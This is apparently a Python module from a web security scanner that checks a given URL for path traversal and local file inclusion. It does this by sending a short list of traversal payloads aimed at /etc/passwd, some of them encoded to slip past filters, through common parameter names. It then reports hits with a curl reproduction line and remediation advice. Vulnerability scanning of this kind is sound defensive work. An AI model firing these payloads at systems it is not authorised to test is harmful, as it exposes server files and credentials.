"""Path Traversal / LFI Scanner."""
import logging
import urllib.request
import urllib.parse
from scanners.core.registry import register_scanner

logger = logging.getLogger("smp.scan")

TRAVERSAL_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd"
]
PARAMS = ["file", "path", "page", "include", "document", "template", "dir", "load", "read", "view"]

@register_scanner(name="Path Traversal Scanner", step_name="Running Path Traversal Scanner", depends_on=['Tech Fingerprint'], binary_name="", needs_binary=False, confidence=85)
def run_path_traversal(url):
    logger.info(f"Path Traversal: Testing {url}")
    base = url.rstrip("/")
    findings = []
    for param in PARAMS:
        for payload in TRAVERSAL_PAYLOADS[:3]:
            test = f"{base}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test, headers={"User-Agent": "SMP/5.4"})
                with urllib.request.urlopen(req, timeout=6) as resp:
                    body = resp.read(512).decode(errors="replace")
                    if "root:x:" in body or "/bin/bash" in body or "/sbin/nologin" in body:
                        findings.append({
                            "severity": "Critical",
                            "title": "Path Traversal / Local File Inclusion",
                            "description": f"LFI via parameter '{param}' — server returned /etc/passwd.",
                            "url": test,
                            "owasp_category": "A01:2021 - Broken Access Control",
                            "cvss_score": 9.1,
                            "affected_component": f"Parameter: {param}",
                            "business_impact": "Path traversal allows reading arbitrary server files including credentials, private keys, and application source code.",
                            "evidence": body[:200],
                            "reproduction_steps": f"curl '{test}'",
                            "remediation_code": "# Sanitise file paths:\nimport os\nbase = '/var/www/html'\nrequested = os.path.realpath(os.path.join(base, user_input))\nif not requested.startswith(base): raise ValueError('Path traversal')",
                            "references_json": ["https://owasp.org/www-project-web-security-testing-guide/", "https://cwe.mitre.org/data/definitions/22.html"]
                        })
            except Exception:
                continue
    return findings
